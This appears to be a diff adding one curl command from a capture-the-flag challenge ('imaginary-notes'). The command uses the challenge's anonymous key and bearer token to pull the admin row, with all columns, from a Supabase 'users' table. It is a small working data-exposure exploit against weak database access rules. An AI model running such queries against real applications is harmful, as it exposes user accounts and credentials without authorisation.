@@ -1,0 +1,10 @@
+curl 'https://dpyxnwiuwzahkxuxrojp.supabase.co/rest/v1/users?select=*&username=eq.admin'   --compressed   -H 'User-A
+gent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0'   -H 'Accept: application/vnd.pg
+rst.object+json'   -H 'Accept-Language: en-US,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate, br, zstd'   -H 'Referer: h
+ttp://imaginary-notes.chal.imaginaryctf.org/'   -H 'accept-profile: public'   -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6Ik
+pXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6M
+jA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI'   -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpX
+VCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA
+2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI'   -H 'x-client-info: supabase-js-web/2.50.3'   -H 'Origin: htt
+p://imaginary-notes.chal.imaginaryctf.org'   -H 'Connection: keep-alive'   -H 'Sec-Fetch-Dest: empty'   -H 'Sec-Fetch-Mo
+de: cors'   -H 'Sec-Fetch-Site: cross-site'   -H 'Priority: u=0'   -H 'TE: trailers'
